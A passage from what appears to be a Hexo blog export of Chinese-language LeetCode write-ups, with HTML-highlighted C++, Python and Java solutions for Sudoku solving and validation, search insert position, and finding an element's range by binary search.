class="keyword">char</span>&gt;&gt; &amp;board)&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; h;</span><br><span class="line">        <span class="keyword">int</span> n = board.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j]==<span class="string">'.'</span>)&#123;</span><br><span class="line">                    h.push_back(i);</span><br><span class="line">                    h.push_back(j);</span><br><span class="line">                    <span class="keyword">return</span> h;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">solveSudokuHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; board)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; h = isfull(board);</span><br><span class="line">        <span class="keyword">if</span> (!h.size())&#123;</span><br><span class="line">            <span class="comment">// base case</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> column = h[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> row = h[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">                board[row][column] = i + <span class="string">'0'</span>;</span><br><span class="line">                <span class="keyword">if</span> (isValidSudoku(board))&#123;</span><br><span class="line">                    <span class="comment">//choose and explore</span></span><br><span class="line">                    <span class="keyword">bool</span> solved = solveSudokuHelper(board);</span><br><span class="line">                    <span class="keyword">if</span> (solved)&#123;</span><br><span class="line">                        <span class="comment">// 只需要1个解即可</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//unchoose</span></span><br><span class="line">                    board[row][column] = <span class="string">'.'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    board[row][column] = <span class="string">'.'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">solveSudoku</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        solveSudokuHelper(board);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[36. Valid Sudoku]]></title>
      <url>/wiki/2017/10/30/Leetcode-36-Valid-Sudoku/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Determine if a 9x9 Sudoku board is valid. Only the filled cells need to be validated according to the following rules:</p>
<ul>
<li>Each row must contain the digits <code>1-9</code> without repetition.</li>
<li>Each column must contain the digits <code>1-9</code> without repetition.</li>
<li>Each of the 9 <code>3x3</code> sub-boxes of the grid must contain the digits <code>1-9</code> without repetition.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15271493262650.png" alt=""></p>
<p>A partially filled sudoku which is valid.</p>
<p>The Sudoku board could be partially filled, where empty cells are filled with the character <code>.</code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [&quot;5&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;],</span><br><span class="line">  [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;],</span><br><span class="line">  [&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]</span><br><span class="line">]</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [&quot;8&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;],</span><br><span class="line">  [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;],</span><br><span class="line">  [&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]</span><br><span class="line">]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: Same as Example 1, except with the 5 in the top left corner being modified to 8. Since there are two 8&apos;s in the top left 3x3 sub-box, it is invalid.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>A Sudoku board (partially filled) could be valid but is not necessarily solvable.</li>
<li>Only the filled cells need to be validated according to the mentioned rules.</li>
<li>The given board contain only digits 1-9 and the character ‘.’.</li>
<li>The given board size is always 9x9.</li>
</ul>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用hash table(这里是字典)，识别是否出现数字重复。利用numpy方便处理矩阵元素。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">no_repetation</span><span class="params">(self, alist)</span>:</span></span><br><span class="line">        n = len(alist)</span><br><span class="line">        mydict = &#123;<span class="string">"1"</span>:<span class="number">0</span>,<span class="string">"2"</span>:<span class="number">0</span>,<span class="string">"3"</span>:<span class="number">0</span>, <span class="string">"4"</span>:<span class="number">0</span>,<span class="string">"5"</span>:<span class="number">0</span>, <span class="string">"6"</span>:<span class="number">0</span>, <span class="string">"7"</span>:<span class="number">0</span>, <span class="string">"8"</span>:<span class="number">0</span>, <span class="string">"9"</span>:<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> alist:</span><br><span class="line">            <span class="keyword">if</span> x == <span class="string">'.'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> mydict[x] == <span class="number">0</span>:</span><br><span class="line">                    mydict[x] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValidSudoku</span><span class="params">(self, board)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">        <span class="keyword">import</span> copy</span><br><span class="line">        </span><br><span class="line">        myboard = np.array(board)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Each row, column must contain the digits 1-9 without repetition.</span></span><br><span class="line">            eachrow = myboard[i,:]</span><br><span class="line">            repetation = self.no_repetation(eachrow)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> repetation:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Each row, column must contain the digits 1-9 without repetition.</span></span><br><span class="line">            eachcolumn = myboard[:,i]</span><br><span class="line">            repetation = self.no_repetation(eachcolumn)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> repetation:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Each of the 9 3x3 sub-boxes of the grid must contain the digits 1-9 without repetition.</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                eachblock = myboard[i*<span class="number">3</span>:(i+<span class="number">1</span>)*<span class="number">3</span>, j*<span class="number">3</span>:(j+<span class="number">1</span>)*<span class="number">3</span>].reshape((<span class="number">-1</span>,))</span><br><span class="line">                repetation = self.no_repetation(eachblock)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> repetation:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">```       </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">还有一种更巧妙的方法，就是每一行、每一列、每一块都是一个字典预先放在列表中；并且对于块的处理，巧妙的利用矩阵元素的行列数计算所在的块：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValidSudoku</span><span class="params">(self, board)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        dic_row = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;]</span><br><span class="line">        dic_col = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;]</span><br><span class="line">        dic_box = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board)):</span><br><span class="line">                num = board[i][j]</span><br><span class="line">                <span class="keyword">if</span> num == <span class="string">"."</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> dic_row[i] <span class="keyword">and</span> num <span class="keyword">not</span> <span class="keyword">in</span> dic_col[j] \\ </span><br><span class="line">                    <span class="keyword">and</span> num <span class="keyword">not</span> <span class="keyword">in</span> dic_box[<span class="number">3</span>*(i//<span class="number">3</span>)+(j//<span class="number">3</span>)]:</span><br><span class="line">                    dic_row[i][num] = <span class="number">1</span></span><br><span class="line">                    dic_col[j][num] = <span class="number">1</span></span><br><span class="line">                    dic_box[<span class="number">3</span>*(i//<span class="number">3</span>)+(j//<span class="number">3</span>)][num] = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<p>对应的C++版本为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isValidSudoku</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; &gt; &amp;board)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> used1[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;, used2[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;, used3[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.size(); ++ i)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[i].size(); ++ j)</span><br><span class="line">                <span class="keyword">if</span>(board[i][j] != <span class="string">'.'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> num = board[i][j] - <span class="string">'0'</span> - <span class="number">1</span>, k = i / <span class="number">3</span> * <span class="number">3</span> + j / <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">if</span>(used1[i][num] || used2[j][num] || used3[k][num])</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    used1[i][num] = used2[j][num] = used3[k][num] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[35. Search Insert Position]]></title>
      <url>/wiki/2017/10/30/Leetcode-35-Search-Insert-Position/</url>
      <content type="html"><![CDATA[<p>Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.</p>
<p>You may assume no duplicates in the array.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 5</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 2</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 7</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure>
<p>Example 4:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 0</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>
<p>这道题比较简单，就是<strong>二分查找</strong>(<code>binary search</code>)。思路就是每次取中间，如果等于目标即返回，否则根据大小关系切去一半。因此算法复杂度是$O(\log n)$，空间复杂度$O(1)$。 </p>
<p>注意以上实现方式有一个好处，就是当循环结束时，如果没有找到目标元素，那么first一定停在恰好比目标大的index上，right一定停在恰好比目标小的index上。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        first = <span class="number">0</span></span><br><span class="line">        last = len(nums) - <span class="number">1</span></span><br><span class="line">        found = <span class="keyword">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> first &lt;= last <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">        </span><br><span class="line">            mid = (first + last) //<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">                found = <span class="keyword">True</span></span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">                last = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                first = mid + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> first</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[34. Find First and Last Position of Element in Sorted Array]]></title>
      <url>/wiki/2017/10/30/Leetcode-34-Search-for-a-Range/</url>
      <content type="html"><![CDATA[<p>Given an array of integers <code>nums</code> sorted in ascending order, find the starting and ending position of a given <code>target</code> value.</p>
<p>Your algorithm’s runtime complexity must be in the order of $O(\log n)$.</p>
<p>If the target is not found in the array, return <code>[-1, -1]</code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [5,7,7,8,8,10], target = 8</span><br><span class="line">Output: [3,4]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [5,7,7,8,8,10], target = 6</span><br><span class="line">Output: [-1,-1]</span><br></pre></td></tr></table></figure>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>既然要求$O(\log n)$那必然又是binary search变种。要找到target在数组中的左右边界，必然先得要在数组中找到一个target。一种条件反射的思路是binary search找到target，即<code>A[mid] = target</code>，然后从mid开始向左右扫描来发现左右边界。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchRange</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        n = len(nums) </span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = n - <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        result_left, result_right = <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> left &lt;= right：</span><br><span class="line">            mid = (left + right) //<span class="number">2</span></span><br><span class="line">            print(left, right, mid)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:   </span><br><span class="line">                tmp = mid</span><br><span class="line">                <span class="keyword">while</span> tmp &gt; <span class="number">-1</span> <span class="keyword">and</span> nums[tmp] == target:</span><br><span class="line">                    tmp -= <span class="number">1</span></span><br><span class="line">                result_left = tmp+<span class="number">1</span></span><br><span class="line">                tmp = mid</span><br><span class="line">                <span class="keyword">while</span> tmp &lt; n <span class="keyword">and</span> nums[tmp] == target:</span><br><span class="line">                    tmp += <span class="number">1</span></span><br><span class="line">                result_right = tmp<span class="number">-1</span></span><br><span class="line">                <span class="keyword">return</span> [result_left, result_right]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">                right = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> [<span class="number">-1</span>, <span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
<p>但显然这种算法不是$O(\log n)$的，比如当所有元素都一样，并且等于target时，算法退化为$O(n)$。</p>
<p>二分查找时特殊处理<code>target = A[mid]</code>的情况<br>对搜索left：如果<code>target = A[mid]</code>则继续向左找，否则向右找。直到搜索结束，<code>left = start</code><br>对搜索right：如果<code>target = A[mid]</code>则继续向右找，否则向左找。直到搜索结束，<code>right = end</code><br>最后判断如果<code>A[left], A[right] != target</code>，则表明target不存在于数组中, <code>left = right = -1</code>。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目思路是非常简单的，但是题目有个要求就是必须要有$O(\log n)$的时间复杂度，这就增加了题目的难度。对于在排序的数列中寻找一个值来说，最经典的就是二分查找了。但是题目要求我们必须找到左右边界。可以很自然的想到，当找到一个数时，依次向左/向右寻找边界，就可以寻找到答案。非常不幸的是，这违反了时间复杂度：设想最坏的情况，当数组的所有值都是该值时，需要遍历整个数组，时间复杂度达到了$O(n)$。</p>
<p>一个更优化的方案是，在寻找左右边界时也采用二分查找的办法，具体方法是：先找到该值的位置find, 针对左边界，寻找[0, find]的区间，针对右边界，寻找[find, nums.length-1]区间，直到区间内找不到该值。</p>
<p><code>rank()</code>方法查找的是该区间内的值，如果查找到该值，则返回该值的位置；如果没有查找到该值，则返回小于该值的位置。</p>
<p>另外，特别需要注意程序中下标的溢出。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 